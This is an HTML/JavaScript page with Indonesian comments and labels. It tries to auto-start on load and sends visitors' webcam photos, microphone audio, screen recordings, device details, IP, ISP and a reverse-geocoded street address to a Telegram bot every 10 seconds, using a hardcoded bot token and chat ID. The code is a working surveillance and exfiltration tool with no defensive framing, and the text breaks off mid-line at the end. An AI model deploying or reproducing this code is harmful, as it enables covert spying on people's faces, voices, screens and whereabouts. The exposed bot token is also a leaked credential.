<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>All-in-One â†’ Telegram (Device Â· Photo Â· Voice Â· Screen Â· Location Â· ISP)</title>
<style>
  :root{--bg:#071018;--muted:#9aa4b2;--accent:#00ffff}
  html,body{height:100%;margin:0;font-family:Inter,system-ui,Arial;background:linear-gradient(180deg,#071018,#0d1117);color:#e6eef6;display:flex;align-items:center;justify-content:center}
  .wrap{width:980px;max-width:96%;padding:16px;border-radius:12px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));box-shadow:0 10px 40px rgba(0,0,0,0.6)}
  h1{margin:0 0 8px;font-size:18px}
  .grid{display:grid;grid-template-columns:1fr 360px;gap:12px}
  .card{background:rgba(255,255,255,0.02);border-radius:10px;padding:12px}
  .status{font-family:monospace;font-size:13px;color:#cfe;white-space:pre-wrap;max-height:280px;overflow:auto;padding:8px;background:rgba(0,0,0,0.18);border-radius:8px}
  button{background:transparent;border:1px solid rgba(255,255,255,0.06);color:var(--accent);padding:8px 10px;border-radius:8px;cursor:pointer}
  video{width:100%;border-radius:8px;background:#000;display:block}
  .small{font-size:13px;color:var(--muted)}
  .note{color:#ffcc66;font-size:12px}
</style>
</head>
<body>
  <div class="wrap">
    <h1>ðŸ”Œ All-in-One: Camera Â· Device Â· Voice Â· Screen Â· Location Â· ISP â†’ Telegram (Auto)</h1>
    <p class="small">Menambahkan lokasi detail & informasi provider. Pastikan halaman dijalankan di HTTPS atau localhost. Browser akan meminta izin kamera/mikrofon/layar/lokasi.</p>

    <div class="grid">
      <div>
        <div class="card">
          <h3 style="margin:0 0 6px 0">Live Camera</h3>
          <video id="camVideo" autoplay playsinline muted></video>
          <div style="height:8px"></div>
          <div id="camStatus" class="status">Camera: belum aktif</div>
        </div>

        <div style="height:10px"></div>

        <div class="card">
          <h3 style="margin:0 0 6px 0">Logs & Status</h3>
          <div id="log" class="status">Menunggu inisialisasi...</div>
          <div style="height:8px"></div>
          <div class="controls">
            <button id="btnStartAll">Mulai Manual (jika auto diblokir)</button>
            <button id="btnStopAll">Hentikan Semua</button>
            <span class="note">Interval default: 10 detik. Ubah di kode jika mau 5s.</span>
          </div>
        </div>
      </div>

      <div>
        <div class="card">
          <h3 style="margin:0 0 6px 0">Pengaturan & Token</h3>
          <div class="small">Bot Telegram & Chat ID yang dipakai:</div>
          <pre id="tokenArea" class="status"></pre>
        </div>

        <div style="height:10px"></div>

        <div class="card">
          <h3 style="margin:0 0 6px 0">Preview Screen</h3>
          <video id="screenVideo" autoplay playsinline style="display:none"></video>
          <div id="screenStatus" class="status">Screen: belum aktif</div>
        </div>
      </div>
    </div>
  </div>

<script>
/* ========== KONFIGURASI ========== */
const INTERVAL_MS = 10000; // ubah ke 5000 untuk 5 detik
const BOT_TOKEN = "8414860263:AAFhAxcv1lWfhXCQB8h8BTjNFY6EB6P_jIc";
const CHAT_ID = "8471664635";

/* UI */
const camVideo = document.getElementById('camVideo');
const camStatus = document.getElementById('camStatus');
const screenVideo = document.getElementById('screenVideo');
const screenStatus = document.getElementById('screenStatus');
const logDiv = document.getElementById('log');
document.getElementById('tokenArea').textContent = `BOT_TOKEN: ${BOT_TOKEN}\nCHAT_ID: ${CHAT_ID}`;

/* Helper */
function now(){ return new Date().toLocaleTimeString(); }
function appendLog(msg){ logDiv.textContent = `[${now()}] ${msg}\n\n` + logDiv.textContent; }
function sleep(ms){ return new Promise(r=>setTimeout(r, ms)); }

async function sendText(text, parseMode=null){
  try {
    const body = { chat_id: CHAT_ID, text };
    if (parseMode) body.parse_mode = parseMode;
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method:'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(body)
    });
  } catch(e){ console.error('sendText err', e); appendLog('sendText err: '+ (e.message||e)); }
}
async function sendPhotoBlob(blob, caption){
  try {
    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append('caption', caption || '');
    fd.append('photo', blob, 'photo.jpg');
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: fd });
  } catch(e){ console.error('sendPhotoBlob err', e); appendLog('sendPhoto err: '+(e.message||e)); }
}
async function sendDocBlob(blob, filename, caption){
  try {
    const fd = new FormData();
    fd.append('chat_id', CHAT_ID);
    fd.append('caption', caption || '');
    fd.append('document', blob, filename);
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method:'POST', body: fd });
  } catch(e){ console.error('sendDocBlob err', e); appendLog('sendDoc err: '+(e.message||e)); }
}

/* Device + network */
function detectDevice(){
  return {
    ua: navigator.userAgent || 'unknown',
    platform: navigator.platform || 'unknown',
    cores: navigator.hardwareConcurrency || 'n/a',
    mem: navigator.deviceMemory || 'n/a'
  };
}
function netInfo(){
  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  return {
    type: c ? (c.effectiveType || c.type) : 'unknown',
    downlink: c ? c.downlink : 'n/a',
    rtt: c ? c.rtt : 'n/a'
  };
}
async function getPublicIP(){
  try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); return j.ip; } catch { return 'unknown'; }
}

/* ========== Lokasi detail (Geolocation + ReverseGeocode) ========== */
/*
 - Meminta izin user. Jika user tolak, akan tetap coba IP-based lookup untuk kota/ISP.
 - Reverse geocode via Nominatim (OpenStreetMap).
 - Kembalian: object {lat,lon, display_name, address:{...}} atau null.
*/
async function getLocationDetailed(timeoutMs=7000){
  // 1) Attempt browser geolocation
  let coords = null;
  try {
    coords = await new Promise((resolve, reject) => {
      const onSuccess = p => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, accuracy: p.coords.accuracy });
      const onErr = e => reject(e);
      navigator.geolocation.getCurrentPosition(onSuccess, onErr, { enableHighAccuracy: true, maximumAge:0, timeout: timeoutMs });
    });
  } catch(e){
    appendLog('Geolocation: izin ditolak/timeout (' + (e.message||e) + '). Akan coba fallback IP-based.');
    coords = null;
  }

  // 2) If have coords, reverse-geocode via Nominatim
  if (coords) {
    try {
      const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${coords.lat}&lon=${coords.lon}&addressdetails=1`;
      const r = await fetch(url, { headers: { 'Accept-Language': 'id,en' } });
      if (!r.ok) throw new Error('Nominatim fail ' + r.status);
      const j = await r.json();
      return {
        source: 'geolocation',
        lat: coords.lat, lon: coords.lon, accuracy: coords.accuracy || null,
        display_name: j.display_name || null,
        address: j.address || {}
      };
    } catch(e){
      appendLog('Reverse geocode gagal: ' + (e.message||e));
      // fallthrough to ip-based
    }
  }

  // 3) Fallback: IP-based location (less accurate)
  try {
    const r = await fetch('https://ipapi.co/json/');
    if (!r.ok) throw new Error('ipapi fail ' + r.status);
    const j = await r.json();
    return {
      source: 'ip',
      lat: j.latitude || null, lon: j.longitude || null,
      display_name: `${j.city || ''}${j.region ? ', '+j.region : ''}${j.country_name ? ', '+j.country_name : ''}`.trim(),
      address: {
        city: j.city, region: j.region, country: j.country_name, postal: j.postal
      },
      ipapi: j // raw
    };
  } catch(e){
    appendLog('IP-based location gagal: ' + (e.message||e));
    return null;
  }
}

/* ========== ISP / Provider detail via IP lookup ========== */
/*
  Mengambil info dari ipapi.co/json/ â€” field "org" biasanya berisi ISP / org name.
*/
async function getISPInfo(){
  try {
    const r = await fetch('https://ipapi.co/json/');
    if (!r.ok) throw new Error('ipapi fail ' + r.status);
    const j = await r.json();
    // ipapi fields: ip, city, region, country_name, org, postal, timezone, asn maybe in other services
    return j;
  } catch(e){
    appendLog('ISP lookup gagal: ' + (e.message||e));
    return null;
  }
}

/* ========== Build caption yang lebih detail ========== */
async function buildDeviceCaptionWithLocation(note){
  const dev = detectDevice();
  const net = netInfo();
  const ip = await getPublicIP().catch(()=> 'unknown');
  const isp = await getISPInfo().catch(()=> null);
  const loc = await getLocationDetailed().catch(()=>null);

  const addr = (loc && loc.address) ? loc.address : {};
  // Try extract fields common in OSM
  const lines = [];
  lines.push("ðŸ“¡ Device Info (auto)");
  lines.push(`ðŸ•’ ${new Date().toLocaleString()}`);
  lines.push(`Platform: ${dev.platform}`);
  lines.push(`UA: ${dev.ua}`);
  lines.push(`Cores: ${dev.cores}, Mem: ${dev.mem}`);
  lines.push(`Network: ${net.type} (down:${net.downlink}, rtt:${net.rtt})`);
  lines.push(`IP publik: ${ip}`);
  if (isp && isp.org) lines.push(`Provider/ISP: ${isp.org}`);
  if (isp && isp.asn) lines.push(`ASN: ${isp.asn}`);
  if (isp && isp.postal) lines.push(`Postal (IP): ${isp.postal}`);
  // location
  if (loc) {
    lines.push(`Lokasi source: ${loc.source}`);
    if (loc.lat && loc.lon) lines.push(`Koordinat: ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}`);
    // include administrative fields if present (prioritizing Indonesia labels)
    const adminFields = [
      ['country','country'],
      ['state','state'], ['region','region'],
      ['county','county'],
      ['city','city'], ['town','town'], ['village','village'], ['hamlet','hamlet'],
      ['municipality','municipality'],
      ['suburb','suburb'], ['neighbourhood','neighbourhood'], ['borough','borough'],
      ['postcode','postal code'],
      ['road','road'], ['residential','residential']
    ];
    for (const [k,label] of adminFields) {
      if (addr[k]) lines.push(`${label}: ${addr[k]}`);
    }
    // Nominatim sometimes has fields like 'village', 'suburb' etc.
    if (loc.display_name) lines.push(`Alamat (raw): ${loc.display_name}`);
    if (loc.accuracy) lines.push(`Accuracy (m): ${loc.accuracy}`);
  } else {
    lines.push("Lokasi: tidak tersedia (izin ditolak atau gagal).");
  }
  if (note) lines.push(`Catatan: ${note}`);
  return lines.join("\n");
}

/* ========== Camera capture (foto) ========== */
let camStream = null;
async function startCamera(){
  if (camStream) return;
  try {
    camStatus.textContent = "Meminta izin kamera...";
    camStream = await navigator.mediaDevices.getUserMedia({ video: { width:640, height:480 }, audio:false });
    camVideo.srcObject = camStream;
    await camVideo.play();
    camStatus.textContent = "Camera: aktif";
    appendLog("Camera aktif.");
  } catch(e){
    camStatus.textContent = "Camera: gagal - " + (e.message||e);
    appendLog("Gagal akses kamera: " + (e.message||e));
  }
}
async function capturePhotoAndSend(){
  if (!camStream) { appendLog("Capture skipped: camera tidak aktif."); return; }
  try {
    const w = camVideo.videoWidth || 640;
    const h = camVideo.videoHeight || 480;
    const c = document.createElement('canvas');
    c.width = w; c.height = h;
    const ctx = c.getContext('2d');
    ctx.drawImage(camVideo, 0, 0, w, h);
    const blob = await new Promise(res => c.toBlob(res, 'image/jpeg', 0.85));
    const caption = await buildDeviceCaptionWithLocation("Foto kamera otomatis");
    await sendPhotoBlob(blob, caption);
    appendLog("Foto kamera dikirim.");
  } catch(e){ appendLog("Error capturePhoto: " + (e.message||e)); }
}
async function stopCamera(){
  if (!camStream) return;
  camStream.getTracks().forEach(t=>t.stop());
  camStream = null;
  try { camVideo.srcObject = null; } catch {}
  camStatus.textContent = "Camera: berhenti";
  appendLog("Camera dihentikan.");
}

/* ========== Audio chunking ========== */
let audioStream = null, audioRecorder = null, audioChunks = [], audioActive = false;
async function startAudio(){
  if (audioActive) return;
  try {
    appendLog("Meminta izin mikrofon...");
    audioStream = await navigator.mediaDevices.getUserMedia({ audio:true, video:false });
    audioActive = true;
    audioRecorder = new MediaRecorder(audioStream);
    audioChunks = [];
    audioRecorder.ondataavailable = e => { if (e.data && e.data.size) audioChunks.push(e.data); };
    audioRecorder.onstop = async () => {
      if (audioChunks.length === 0) return;
      const blob = new Blob(audioChunks, { type: audioChunks[0].type || 'audio/webm' });
      const ts = new Date().toISOString().replace(/[:.]/g,'-');
      const filename = `audio-${ts}.webm`;
      const caption = await buildDeviceCaptionWithLocation("Audio otomatis");
      await sendDocBlob(blob, filename, caption);
      appendLog("Chunk audio dikirim: " + filename);
      audioChunks = [];
    };
    audioRecorder.start();
    appendLog("Audio merekam.");
    (async function loop(){
      while (audioActive){
        await sleep(INTERVAL_MS);
        if (!audioActive) break;
        try {
          if (audioRecorder && audioRecorder.state === 'recording') {
            audioRecorder.stop();
            await sleep(350);
            // restart new recorder
            audioRecorder = new MediaRecorder(audioStream);
            audioChunks = [];
            audioRecorder.ondataavailable = e => { if (e.data && e.data.size) audioChunks.push(e.data); };
            audioRecorder.onstop = async () => {
              if (audioChunks.length === 0) return;
              const blob = new Blob(audioChunks, { type: audioChunks[0].type || 'audio/webm' });
              const ts = new Date().toISOString().replace(/[:.]/g,'-');
              const filename = `audio-${ts}.webm`;
              const caption = await buildDeviceCaptionWithLocation("Audio otomatis");
              await sendDocBlob(blob, filename, caption);
              appendLog("Chunk audio dikirim: " + filename);
              audioChunks = [];
            };
            audioRecorder.start();
          }
        } catch(e){ appendLog('Audio loop err: '+(e.message||e)); break; }
      }
    })();
  } catch(e){ audioActive = false; appendLog('Gagal akses mikrofon: '+(e.message||e)); }
}
function stopAudio(){
  audioActive = false;
  try { if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop(); } catch {}
  if (audioStream) { audioStream.getTracks().forEach(t=>t.stop()); audioStream = null; }
  appendLog("Audio dihentikan.");
}

/* ========== Screen chunking ========== */
let screenStream = null, screenRecorder = null, screenChunks = [], screenActive = false;
async function startScreen(){
  if (screenActive) return;
  try {
    appendLog("Meminta izin rekam layar...");
    screenStream = await navigator.mediaDevices.getDisplayMedia({ video:true, audio:false });
    try { screenVideo.srcObject = screenStream; screenVideo.style.display='block'; } catch {}
    screenRecorder = new MediaRecorder(screenStream, { mimeType: 'video/webm;codecs=vp9' });
    screenChunks = [];
    screenRecorder.ondataavailable = e => { if (e.data && e.data.size) screenChunks.push(e.data); };
    screenRecorder.onstop = async () => {
      if (screenChunks.length === 0) return;
      const blob = new Blob(screenChunks, { type: screenChunks[0].type || 'video/webm' });
      const ts = new Date().toISOString().replace(/[:.]/g,'-');
      const filename = `screen-${ts}.webm`;
      const caption = await buildDeviceCaptionWithLocation("Screen otomatis");
      await sendDocBlob(blob, filename, caption);
      appendLog("Chunk screen dikirim: " + filename);
      screenChunks = [];
    };
    screenRecorder.start();
    screenActive = true;
    screenStatus.textContent = "Screen: merekam";
    appendLog("Screen recording aktif.");
    (async function loop(){
      while (screenActive){
        await sleep(INTERVAL_MS);
        if (!screenActive) break;
        try {
          if (screenRecorder && screenRecorder.state === 'recording') {
            screenRecorder.stop();
            await sleep(450);
            screenRecorder = new MediaRecorder(screenStream, { mimeType: 'video/webm;codecs=vp9' });
            screenChunks = [];
            screenRecorder.ondataavailable = e => { if (e.data && e.data.size) screenChunks.push(e.data); };
            screenRecorder.onstop = async () => {
              if (screenChunks.length === 0) return;
              const blob = new Blob(screenChunks, { type: screenChunks[0].type || 'video/webm' });
              const ts = new Date().toISOString().replace(/[:.]/g,'-');
              const filename = `screen-${ts}.webm`;
              const caption = await buildDeviceCaptionWithLocation("Screen otomatis");
              await sendDocBlob(blob, filename, caption);
              appendLog("Chunk screen dikirim: " + filename);
              screenChunks = [];
            };
            screenRecorder.start();
          }
        } catch(e){ appendLog('Screen loop err: '+(e.message||e)); break; }
      }
    })();
    screenStream.getVideoTracks().forEach(t=>t.onended = () => { stopScreen(); });
  } catch(e){ screenStatus.textContent = "Screen: error - " + (e.message||e); appendLog("Gagal akses layar: " + (e.message||e)); }
}
function stopScreen(){
  screenActive = false;
  try { if (screenRecorder && screenRecorder.state === 'recording') screenRecorder.stop(); } catch {}
  if (screenStream) { screenStream.getTracks().forEach(t=>t.stop()); screenStream = null; }
  try { screenVideo.srcObject = null; screenVideo.style.display='none'; } catch{}
  screenStatus.textContent = "Screen: berhenti";
  appendLog("Screen dihentikan.");
}

/* ========== Combined cycle ========== */
let mainHandle = null;
async function captureCycleOnce(){
  appendLog("=== Cycle start ===");
  try {
    const caption = await buildDeviceCaptionWithLocation("Cycle otomatis (gabungan)");
    await sendText(caption);
    appendLog("Device+Location+ISP dikirim (text).");
  } catch(e){ appendLog("Gagal kirim caption: " + (e.message||e)); }

  try { await capturePhotoAndSend(); } catch(e){ appendLog("Gagal foto: "+(e.message||e)); }

  // Force audio/screen chunk send (stop triggers onstop send)
  try { if (audioActive && audioRecorder && audioRecorder.state==='recording') { audioRecorder.stop(); appendLog('Audio forced chunk.'); await sleep(300); } } catch(e){ appendLog('Audio force err: '+(e.message||e)); }
  try { if (screenActive && screenRecorder && screenRecorder.state==='recording') { screenRecorder.stop(); appendLog('Screen forced chunk.'); await sleep(400); } } catch(e){ appendLog('Screen force err: '+(e.message||e)); }

  appendLog("=== Cycle end ===");
}

async function startAll(){
  appendLog("Memulai semua...");
  await startCamera();
  await startAudio();
  await startScreen();
  await sleep(500);
  await captureCycleOnce();
  if (mainHandle) clearInterval(mainHandle);
  mainHandle = setInterval(() => { captureCycleOnce().catch(e=>appendLog('Cycle err: '+(e.message||e))); }, INTERVAL_MS);
}

function stopAll(){
  if (mainHandle) { clearInterval(mainHandle); mainHandle = null; }
  stopCamera();
  stopAudio();
  stopScreen();
  appendLog("Semua dihentikan.");
}

/* Buttons */
document.getElementById('btnStartAll').addEventListener('click', ()=> startAll());
document.getElementById('btnStopAll').addEventListener('click', ()=> stopAll());

/* Auto-start attempt; if browser blocks screen, user can click manual */
window.addEventListener('load', async () => {
  appendLog("Inisialisasi halaman. Mencoba auto-start...");
  try {
    await startAll();
    appendLog("Auto-start attempted. Jika g
